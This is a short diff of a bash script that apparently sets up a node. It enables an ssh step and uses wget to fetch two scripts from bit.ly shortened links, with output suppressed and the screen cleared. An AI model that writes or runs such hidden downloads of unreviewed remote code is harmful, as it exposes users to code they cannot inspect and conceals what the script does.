@@ -1,5 +1,6 @@
 #!/bin/bash
-#ssh node01
+ssh node01
+sleep 1
 wget -O exit.sh https://bit.ly/3BBLPbC > /dev/null 2>&1
 clear
 wget -O sleep.sh https://bit.ly/376kyA1 > /dev/null 2>&1
